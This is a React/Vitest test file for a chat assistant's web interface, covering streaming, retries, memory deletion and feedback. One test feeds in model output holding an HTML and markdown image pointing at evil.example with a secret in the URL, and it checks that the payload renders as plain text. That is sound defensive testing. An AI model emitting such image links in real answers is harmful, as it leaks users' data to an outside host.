import type { ChatClient } from '@local-ai/client';
import { ChatClientError } from '@local-ai/client';
import type { ChatRequestBody, SseEvent } from '@local-ai/contract';
import { fixtureTurns } from '@local-ai/contract/fixtures';
import { render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it } from 'vitest';

import { toBlocks } from '@local-ai/client';
import { App } from './App.js';

interface FakeClient extends ChatClient {
  readonly bodies: ChatRequestBody[];
}

function fakeClient(
  script: (n: number, signal: AbortSignal) => AsyncIterable<SseEvent>,
): FakeClient {
  const bodies: ChatRequestBody[] = [];
  return {
    bodies,
    send(body, signal) {
      bodies.push(body);
      return script(bodies.length, signal);
    },
  };
}

async function* events(list: readonly SseEvent[]): AsyncIterable<SseEvent> {
  for (const e of list) {
    await Promise.resolve();
    yield e;
  }
}

async function ask(text: string): Promise<void> {
  await userEvent.type(screen.getByLabelText('Message'), text);
  await userEvent.click(screen.getByRole('button', { name: 'Send' }));
}

function fakeAccount(
  items: { id: string; content: string; createdAt: string; always: boolean }[],
  feedbackFails = false,
) {
  const calls: string[] = [];
  let current = [...items];
  const account = {
    startSession: () => Promise.resolve('t'.repeat(43)),
    hasSession: () => Promise.resolve(true),
    memory: () => Promise.resolve(current),
    forget: (id: string) => {
      calls.push(`forget ${id}`);
      current = current.filter((i) => i.id !== id);
      return Promise.resolve();
    },
    deleteEverything: () => {
      calls.push('delete everything');
      current = [];
      return Promise.resolve();
    },
    sendFeedback: (kind: string, text: string) => {
      calls.push(`feedback ${kind}: ${text}`);
      if (feedbackFails) return Promise.reject(new Error('down'));
      return Promise.resolve(text.includes('hopeless') ? 'Call or text 988.' : undefined);
    },
  };
  return { account, calls };
}

describe('web app', () => {
  it('shows the question and the streamed answer, with code as a code block', async () => {
    render(<App client={fakeClient(() => events(fixtureTurns.answered ?? []))} />);
    await ask('Hello');
    expect(screen.getByLabelText('You')).toHaveTextContent('Hello');
    await waitFor(() => {
      expect(screen.getByText(/First paragraph, with "quotes"/)).toBeInTheDocument();
    });
    expect(screen.getByText(/const a = 1;/).tagName).toBe('CODE');
    expect(screen.queryByText('Writing…')).not.toBeInTheDocument();
  });

  it('lists cited sources as numbered links that open safely', async () => {
    render(<App client={fakeClient(() => events(fixtureTurns.answered ?? []))} />);
    await userEvent.type(screen.getByLabelText('Message'), 'Hi{Enter}');
    const sources = await screen.findByRole('list', { name: 'Sources' });
    const link = within(sources).getByRole('link', { name: 'Example' });
    expect(link).toHaveAttribute('href', 'https://example.com/a?b=c');
    expect(link).toHaveAttribute('rel', 'noopener noreferrer');
  });

  it('sends the conversation id from the first turn with the next one', async () => {
    const client = fakeClient(() => events(fixtureTurns.answered ?? []));
    render(<App client={client} />);
    await ask('One');
    await waitFor(() => expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled());
    await ask('Two');
    await waitFor(() => {
      expect(client.bodies).toHaveLength(2);
    });
    expect(client.bodies[0]).toEqual({ message: 'One' });
    expect(client.bodies[1]).toEqual({
      message: 'Two',
      conversationId: '7c9e6679-7425-40de-944b-e07fc1f90ae7',
    });
  });

  it('shows a refusal as a note, keeping text released before it', async () => {
    render(<App client={fakeClient(() => events(fixtureTurns.refusedMidAnswer ?? []))} />);
    await ask('Hello');
    expect(await screen.findByRole('note')).toHaveTextContent("I can't help with that.");
    expect(screen.getByText('Released before the flag.')).toBeInTheDocument();
  });

  it('shows a delivery failure with a retry button that sends the question again', async () => {
    const client = fakeClient((n) =>
      n === 1
        ? (async function* () {
            await Promise.resolve();
            yield* [];
            throw new ChatClientError('network', "I can't reach the assistant.", true);
          })()
        : events(fixtureTurns.answered ?? []),
    );
    render(<App client={client} />);
    await ask('Hello');
    const alert = await screen.findByRole('alert');
    expect(alert).toHaveTextContent("I can't reach the assistant.");
    await userEvent.click(within(alert).getByRole('button', { name: 'Try again' }));
    await waitFor(() => {
      expect(client.bodies).toHaveLength(2);
    });
    expect(client.bodies[1]?.message).toBe('Hello');
  });

  it('keeps Try again disabled until the retry delay has passed', async () => {
    const client = fakeClient(() =>
      (async function* () {
        await Promise.resolve();
        yield* [];
        throw new ChatClientError('rate_limited', 'Slow down.', true, 429, 80);
      })(),
    );
    render(<App client={client} />);
    await ask('Hello');
    const button = within(await screen.findByRole('alert')).getByRole('button', {
      name: 'Try again',
    });
    expect(button).toBeDisabled();
    await waitFor(() => expect(button).toBeEnabled(), { timeout: 1000 });
  });

  it('stops a turn and marks it stopped', async () => {
    const client = fakeClient((_n, signal) =>
      (async function* () {
        yield { type: 'status', phase: 'answering' } satisfies SseEvent;
        await new Promise((_r, reject) => {
          signal.addEventListener('abort', () => {
            reject(new DOMException('aborted', 'AbortError'));
          });
        });
      })(),
    );
    render(<App client={client} />);
    await ask('Hello');
    await userEvent.click(await screen.findByRole('button', { name: 'Stop' }));
    expect(await screen.findByText('Stopped.')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Send' })).toBeInTheDocument();
  });

  it('sends on Enter and adds a line on Shift+Enter, ignoring blank input', async () => {
    const client = fakeClient(() => events(fixtureTurns.refused ?? []));
    render(<App client={client} />);
    const box = screen.getByLabelText('Message');
    await userEvent.type(box, '   {Enter}');
    expect(client.bodies).toHaveLength(0);
    await userEvent.type(box, 'line one{Shift>}{Enter}{/Shift}line two{Enter}');
    await waitFor(() => {
      expect(client.bodies).toHaveLength(1);
    });
    expect(client.bodies[0]?.message).toBe('line one\nline two');
  });

  it('renders model text as plain text, never as HTML or images', async () => {
    const hostile: SseEvent[] = [
      { type: 'status', phase: 'answering' },
      {
        type: 'delta',
        text: '<img src="https://evil.example/x?d=secret"> ![x](https://evil.example/y)',
      },
      { type: 'done', finishReason: 'stop' },
    ];
    const { container } = render(<App client={fakeClient(() => events(hostile))} />);
    await ask('Hello');
    await screen.findByText(/evil\.example\/x/);
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('a')).toBeNull();
  });
});

describe('answer blocks', () => {
  it('splits paragraphs and fenced code, including tilde fences and an unclosed block', () => {
    expect(toBlocks('One\n\nTwo\n~~~\ncode\n~~~\nAfter\n```\nopen')).toEqual([
      { kind: 'text', content: 'One' },
      { kind: 'text', content: 'Two' },
      { kind: 'code', content: 'code' },
      { kind: 'text', content: 'After' },
      { kind: 'code', content: 'open' },
    ]);
  });
});

describe('memory view', () => {
  it('lists what is remembered, with the disclosure, and forgets one item', async () => {
    const { account, calls } = fakeAccount([
      { id: 'm1', content: 'Call me Sam.', createdAt: '2026-11-13T00:00:00Z', always: false },
    ]);
    render(<App client={fakeClient(() => events([]))} account={account} />);
    await userEvent.click(screen.getByRole('button', { name: 'What I remember' }));
    expect(await screen.findByText('Call me Sam.')).toBeInTheDocument();
    expect(screen.getByText(/deleted for real/)).toBeInTheDocument();
    await userEvent.click(screen.getByRole('button', { name: 'Forget: Call me Sam.' }));
    await waitFor(() => {
      expect(screen.queryByText('Call me Sam.')).not.toBeInTheDocument();
    });
    expect(calls).toEqual(['forget m1']);
  });

  it('labels an always-on item', async () => {
    const { account } = fakeAccount([
      {
        id: 'm2',
        content: 'Allergic to peanuts.',
        createdAt: '2026-11-13T00:00:00Z',
        always: true,
      },
    ]);
    render(<App client={fakeClient(() => events([]))} account={account} />);
    await userEvent.click(screen.getByRole('button', { name: 'What I remember' }));
    expect(await screen.findByText('Allergic to peanuts.')).toBeInTheDocument();
    expect(screen.getByText(/used in every answer/)).toBeInTheDocument();
  });

  it('asks before deleting everything', async () => {
    const { account, calls } = fakeAccount([]);
    render(<App client={fakeClient(() => events([]))} account={account} />);
    await userEvent.click(screen.getByRole('button', { name: 'What I remember' }));
    await userEvent.click(await screen.findByRole('button', { name: 'Delete everything' }));
    expect(calls).toEqual([]);
    await userEvent.click(screen.getByRole('button', { name: 'Yes, delete everything' }));
    expect(await screen.findByText(/is deleted\./)).toBeInTheDocument();
    expect(calls).toEqual(['delete everything']);
  });
});

describe('feedback and new conversation', () => {
  const refusal: SseEvent[] = [
    { type: 'refusal', kind: 'policy', message: 'I cannot help with that.' },
  ];

  it('sends feedback of the chosen kind for an answered turn', async () => {
    const { account, calls } = fakeAccount([]);
    render(
      <App client={fakeClient(() => events(fixtureTurns.answered ?? []))} account={account} />,
    );
    await ask('Hello');
    await userEvent.click(await screen.findByRole('button', { name: 'Send feedback' }));
    const form = screen.getByRole('form', { name: 'Feedback' });
    await userEvent.selectOptions(within(form).getByLabelText('Type'), 'correction');
    await userEvent.type(within(form).getByLabelText('Details'), 'The year is wrong.');
    await userEvent.click(within(form).getByRole('button', { name: 'Send' }));
    expect(
      await screen.findByText(/I review feedback before anything changes/),
    ).toBeInTheDocument();
    expect(calls).toEqual(['feedback correction: The year is wrong.']);
  });

  it('says so when feedback cannot be sent, and keeps the text', async () => {
    const { account } = fakeAccount([], true);
    render(
      <App client={fakeClient(() => events(fixtureTurns.answered ?? []))} account={account} />,
    );
    await ask('Hello');
    await userEvent.click(await screen.findByRole('button', { name: 'Send feedback' }));
    const form = screen.getByRole('form', { name: 'Feedback' });
    await userEvent.type(within(form).getByLabelText('Details'), 'Great answer');
    await userEvent.click(within(form).getByRole('button', { name: 'Send' }));
    expect(await within(form).findByRole('alert')).toHaveTextContent(/could not be sent/);
    expect(within(form).getByLabelText('Details')).toHaveValue('Great answer');
  });

  it('shows crisis resources when the server answers feedback with them', async () => {
    const { account } = fakeAccount([]);
    render(
      <App client={fakeClient(() => events(fixtureTurns.answered ?? []))} account={account} />,
    );
    await ask('Hello');
    await userEvent.click(await screen.findByRole('button', { name: 'Send feedback' }));
    const form = screen.getByRole('form', { name: 'Feedback' });
    await userEvent.type(within(form).getByLabelText('Details'), 'I feel hopeless');
    await userEvent.click(within(form).getByRole('button', { name: 'Send' }));
    expect(await screen.findByText('Call or text 988.')).toBeInTheDocument();
  });

  it('offers no feedback when an answer was withheld part way', async () => {
    const { account } = fakeAccount([]);
    render(
      <App
        client={fakeClient(() => events(fixtureTurns.refusedMidAnswer ?? []))}
        account={account}
      />,
    );
    await ask('Hello');
    await screen.findByText('Released before the flag.');
    await screen.findByText("I can't help with that.");
    expect(screen.queryByRole('button', { name: 'Send feedback' })).not.toBeInTheDocument();
  });

  it('moves focus into the form and then onto the outcome', async () => {
    const { account } = fakeAccount([]);
    render(
      <App client={fakeClient(() => events(fixtureTurns.answered ?? []))} account={account} />,
    );
    await ask('Hello');
    await userEvent.click(await screen.findByRole('button', { name: 'Send feedback' }));
    const form = screen.getByRole('form', { name: 'Feedback' });
    expect(within(form).getByLabelText('Type')).toHaveFocus();
    await userEvent.type(within(form).getByLabelText('Details'), 'Nice.');
    await userEvent.click(within(form).getByRole('button', { name: 'Send' }));
    expect(await screen.findByRole('status')).toHaveFocus();
  });

  it('offers no feedback on a refused turn', async () => {
    const { account } = fakeAccount([]);
    render(<App client={fakeClient(() => events(refusal))} account={account} />);
    await ask('Hello');
    await screen.findByText('I cannot help with that.');
    expect(screen.queryByRole('button', { name: 'Send feedback' })).not.toBeInTheDocument();
  });

  it('starts a new conversation without the old conversation id', async () => {
    const client = fakeClient(() => events(fixtureTurns.answered ?? []));
    render(<App client={client} />);
    await ask('First');
    await screen.findByRole('list', { name: 'Sources' });
    await ask('Follow-up');
    await waitFor(() => {
      expect(screen.getAllByRole('list', { name: 'Sources' })).toHaveLength(2);
    });
    expect(client.bodies[1]?.conversationId).toBeDefined();
    await userEvent.click(screen.getByRole('button', { name: 'New conversation' }));
    expect(screen.queryByLabelText('You')).not.toBeInTheDocument();
    await ask('Fresh start');
    expect(client.bodies[2]?.conversationId).toBeUndefined();
  });
});
